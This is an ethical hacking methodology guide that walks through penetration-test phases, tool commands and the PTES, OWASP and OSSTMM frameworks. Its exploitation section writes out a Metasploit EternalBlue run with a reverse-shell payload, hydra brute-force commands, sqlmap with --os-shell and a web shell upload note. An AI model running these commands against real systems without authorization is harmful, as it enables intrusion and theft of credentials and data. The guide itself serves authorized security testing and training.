# Ethical Hacking Methodology

## Table of Contents

1. [Methodology Overview](#methodology-overview)
2. [Phase 1: Pre-Engagement](#phase-1-pre-engagement)
3. [Phase 2: Reconnaissance](#phase-2-reconnaissance)
4. [Phase 3: Scanning](#phase-3-scanning)
5. [Phase 4: Exploitation](#phase-4-exploitation)
6. [Phase 5: Post-Exploitation](#phase-5-post-exploitation)
7. [Phase 6: Reporting](#phase-6-reporting)
8. [Methodology Frameworks](#methodology-frameworks)

---

## Methodology Overview

### Standard Penetration Testing Flow

```
┌─────────────────────────────────────────────────────────────┐
│                 PENETRATION TESTING FLOW                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────┐                                          │
│  │ Pre-Engagement│ ← Contracts, scope, rules                │
│  └──────┬───────┘                                          │
│         ↓                                                   │
│  ┌──────────────┐                                          │
│  │Reconnaissance│ ← OSINT, passive, active                 │
│  └──────┬───────┘                                          │
│         ↓                                                   │
│  ┌──────────────┐                                          │
│  │   Scanning   │ ← Ports, services, vulns                 │
│  └──────┬───────┘                                          │
│         ↓                                                   │
│  ┌──────────────┐                                          │
│  │  Exploitation│ ← Gain access                           │
│  └──────┬───────┘                                          │
│         ↓                                                   │
│  ┌──────────────┐                                          │
│  │Post-Exploit  │ ← Persistence, pivot, exfil              │
│  └──────┬───────┘                                          │
│         ↓                                                   │
│  ┌──────────────┐                                          │
│  │   Reporting  │ ← Document, recommend                    │
│  └──────────────┘                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Testing Types

| Type | Knowledge | Speed | Coverage |
|------|-----------|-------|----------|
| Black Box | None | Slower | Real-world |
| White Box | Full | Faster | Comprehensive |
| Gray Box | Partial | Medium | Balanced |

---

## Phase 1: Pre-Engagement

### Planning Checklist

```
□ Initial consultation
□ Scope definition
□ Rules of Engagement (ROE)
□ Legal authorization
□ NDA signing
□ Emergency contacts
□ Communication plan
□ Testing window
□ Tool approval
□ Data handling agreement
```

### Rules of Engagement Template

```markdown
# Rules of Engagement

## Authorization
- Client: [Company Name]
- Authorized by: [Name, Title]
- Date: [Start] to [End]

## Scope
- In-Scope: [IP ranges, domains, applications]
- Out-of-Scope: [Specific exclusions]
- Testing Hours: [Window]

## Prohibited Actions
- No denial of service attacks
- No production data exfiltration
- No physical security testing
- No social engineering (unless approved)

## Reporting
- Critical findings: Immediate notification
- Final report: Within X days

## Emergency Contacts
- Technical: [Name, Phone]
- Management: [Name, Phone]
```

### Reconnaissance Planning

```python
# Reconnaissance planning script
def plan_recon(target):
    recon_plan = {
        "passive": [
            "WHOIS lookup",
            "DNS enumeration",
            "Google dorking",
            "Social media OSINT",
            "Code repository search",
            "Job posting analysis",
            "Technology stack identification"
        ],
        "active": [
            "Port scanning",
            "Service enumeration",
            "Vulnerability scanning",
            "Web application testing",
            "SSL/TLS assessment"
        ],
        "social": [
            "Employee enumeration",
            "Email harvesting",
            "Phishing campaign (if approved)",
            "Physical reconnaissance"
        ]
    }
    return recon_plan
```

---

## Phase 2: Reconnaissance

### Passive Reconnaissance

```bash
# Domain information
whois target.com
dig target.com ANY
host -t mx target.com
host -t ns target.com

# Subdomain enumeration
amass enum -passive -d target.com
subfinder -d target.com -silent
assetfinder --subs-only target.com

# Email harvesting
theHarvester -d target.com -b all
hunter.io
linkedin2username

# Technology detection
whatweb target.com
wappalyzer
builtwith target.com

# Code repositories
# Search GitHub
"target.com" password
"target.com" api_key
"target.com" secret
```

### Active Reconnaissance

```bash
# Network scanning
nmap -sV -sC -O target.com
nmap -p- -T4 target.com
nmap --script vuln target.com

# Web reconnaissance
nikto -h target.com
dirb http://target.com
gobuster dir -u http://target.com -w wordlist.txt

# SSL/TLS
sslscan target.com
testssl.sh target.com

# SMB
enum4linux -a target
smbclient -L //target -N

# SNMP
snmpwalk -v2c -c public target
snmp-check target
```

### Reconnaissance Tools Matrix

| Tool | Purpose | Type |
|------|---------|------|
| Maltego | Visual OSINT | GUI |
| Recon-ng | Recon framework | CLI |
| theHarvester | Email/subdomain | CLI |
| SpiderFoot | Automated OSINT | GUI/CLI |
| Shodan | IoT search | Web |
| Censys | Internet scanning | Web |
| Google Dorks | Web search | Manual |

---

## Phase 3: Scanning

### Port Scanning

```bash
# TCP SYN scan (stealthy)
nmap -sS -T4 target

# TCP Connect scan
nmap -sT target

# UDP scan
nmap -sU target

# Christmas scan
nmap -sX target

# Null scan
nmap -sN target

# Scan specific ports
nmap -p 22,80,443,8080 target

# Intense scan
nmap -A -T4 -p- target

# Output
nmap -oA output_name target
```

### Service Enumeration

```bash
# Version detection
nmap -sV target

# OS detection
nmap -O target

# Script scanning
nmap --script=default target
nmap --script=vuln target

# Specific scripts
nmap --script=http-enum target
nmap --script=smb-enum-shares target
nmap --script=ssl-heartbleed target
```

### Vulnerability Scanning

```bash
# Nessus
# Configure policy and scan via web interface

# OpenVAS
openvas-cli --scan-target target.com

# Nikto
nikto -h target.com -o results.html

# WPScan
wpscan --url http://target.com

# SQLMap
sqlmap -u "http://target.com/page?id=1" --batch
```

### Network Mapping

```
Document discovered:

Hosts:
├── IP addresses
├── Operating systems
├── Hostnames
└── MAC addresses

Services:
├── Open ports
├── Running services
├── Versions
└── Configurations

Network:
├── Topology
├── VLANs
├── Firewalls
└── Segmentation
```

---

## Phase 4: Exploitation

### Exploitation Process

```
1. Select Target
   ↓
2. Choose Exploit
   ↓
3. Configure Options
   ↓
4. Set Payload
   ↓
5. Launch Attack
   ↓
6. Verify Access
```

### Exploitation Methods

```bash
# Metasploit
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Password attacks
hydra -l admin -P passwords.txt ssh://target
hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^"

# SQL injection
sqlmap -u "http://target.com/page?id=1" --os-shell

# Web shell upload
# Upload PHP shell via vulnerable upload
# Access: http://target.com/uploads/shell.php
```

### Exploitation Techniques

```
Network Exploits:
├── EternalBlue (MS17-010)
├── BlueKeep (CVE-2019-0708)
├── SMB vulnerabilities
└── SSH brute force

Web Exploits:
├── SQL injection
├── Cross-site scripting
├── Remote code execution
├── File upload vulnerabilities
└── SSRF

Client-Side:
├── Phishing with payload
├── Malicious documents
├── Browser exploitation
└── Drive-by downloads

Password Attacks:
├── Brute force
├── Dictionary
├── Rainbow tables
├── Credential stuffing
└── Pass-the-hash
```

---

## Phase 5: Post-Exploitation

### Post-Exploitation Goals

```
□ Verify access
□ Escalate privileges
□ Maintain persistence
□ Lateral movement
□ Data exfiltration
□ Evidence collection
□ Clean up
```

### Privilege Escalation

```bash
# Linux
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
uname -a

# Windows
whoami /all
systeminfo
net user
net localgroup administrators

# Tools
./LinPEAS.sh
.\WinPEAS.exe
```

### Lateral Movement

```
Techniques:
├── Pass-the-Hash
├── Pass-the-Ticket
├── Credential reuse
├── SMB relay
├── RDP hijacking
├── PowerShell remoting
└── WMI execution
```

### Data Exfiltration

```bash
# Methods
├── HTTP/HTTPS
├── DNS tunneling
├── ICMP tunneling
├── SMB
├── SCP/SFTP
└── Cloud storage
```

### Evidence Collection

```python
# Document everything
evidence = {
    "screenshots": ["login.png", "access.png"],
    "logs": ["command_history.txt", "output.log"],
    "hashes": ["file_hashes.txt"],
    "network": ["pcap_files.pcap"],
    "timestamps": ["timeline.txt"]
}
```

---

## Phase 6: Reporting

### Report Structure

```
1. Executive Summary
   ├── Scope overview
   ├── Testing dates
   ├── Key findings
   └── Risk summary

2. Technical Findings
   ├── Critical vulnerabilities
   ├── High vulnerabilities
   ├── Medium vulnerabilities
   ├── Low vulnerabilities
   └── Informational

3. Finding Details (for each)
   ├── Title
   ├── Severity
   ├── CVSS score
   ├── Description
   ├── Evidence
   ├── Impact
   └── Remediation

4. Methodology
   ├── Tools used
   ├── Techniques
   └── Timeline

5. Recommendations
   ├── Immediate actions
   ├── Long-term improvements
   └── Best practices

6. Appendices
   ├── Raw scan data
   ├── Tool output
   └── Glossary
```

### Finding Severity Levels

| Severity | Description | CVSS |
|----------|-------------|------|
| Critical | Immediate exploitation | 9.0-10.0 |
| High | Easy exploitation, high impact | 7.0-8.9 |
| Medium | Some conditions required | 4.0-6.9 |
| Low | Limited impact | 0.1-3.9 |
| Info | Best practice recommendation | 0.0 |

---

## Methodology Frameworks

### PTES (Penetration Testing Execution Standard)

```
1. Pre-Engagement
   ├── Intelligence gathering
   └── Threat modeling

2. Intelligence Gathering
   ├── OSINT
   ├── Covert gathering
   └── Foot printing

3. Threat Modeling
   ├── Attack vectors
   └── Impact assessment

4. Vulnerability Analysis
   ├── Discovery
   └── Verification

5. Exploitation
   ├── Precision testing
   └── Attack results

6. Post Exploitation
   ├── Objectives
   └── Evidence gathering

7. Reporting
   ├── Executive summary
   └── Technical detail
```

### OWASP Testing Guide

```
Web Application Testing:

1. Information Gathering
   ├── Reconnaissance
   ├── Mapping
   └── Fingerprinting

2. Configuration Management
   ├── Server
   ├── Database
   └── Framework

3. Identity Management
   ├── Authentication
   └── Authorization

4. Authentication
   ├── Mechanisms
   ├── Credentials
   └── Session management

5. Authorization
   ├── Directory traversal
   └── Function level

6. Session Management
   ├── Tokens
   ├── Logout
   └── Timeout

7. Input Validation
   ├── XSS
   ├── SQL injection
   └── Command injection

8. Error Handling
   ├── Stack traces
   └── Error messages

9. Cryptography
   ├── Weak algorithms
   └── Key management

10. Business Logic
    ├── Process bypass
    └── Data manipulation
```

### OSSTMM

```
Operational Security Testing Metrics:

Channels:
├── Human (social engineering)
├── Physical (access control)
├── Wireless (radio frequencies)
├── Telecommunications (phone systems)
└── Network (data networks)

Metrics:
├── AST (Attack Surface Thickness)
├── RVA (Research Vulnerability Analysis)
├── RRA (Risk Response Analysis)
└── ICE (Intelligence Concurrent Exposure)
```

---

## Testing Checklist

### Network Penetration Test

```
□ Scope confirmation
□ Reconnaissance complete
□ Ports scanned
□ Services enumerated
□ Vulnerabilities identified
□ Exploits attempted
□ Access gained
□ Privileges escalated
□ Lateral movement attempted
□ Data accessed
□ Persistence established
□ Evidence collected
□ Systems cleaned
□ Report drafted
□ Remediation verified
```

### Web Application Test

```
□ Authentication tested
□ Authorization tested
□ Session management reviewed
□ Input validation checked
□ SQL injection tested
□ XSS tested
□ CSRF tested
□ File upload tested
□ Business logic reviewed
□ Error handling checked
□ Cryptography reviewed
□ Configuration reviewed
□ Evidence collected
□ Report drafted
```

---

## Time Estimation

```
Typical Engagement Timeline:

Week 1: Pre-engagement & Reconnaissance
Week 2: Scanning & Enumeration
Week 3: Exploitation & Post-Exploitation
Week 4: Reporting & Remediation Verification

Note: Duration varies based on scope
```

---

*Last Updated: 2024*
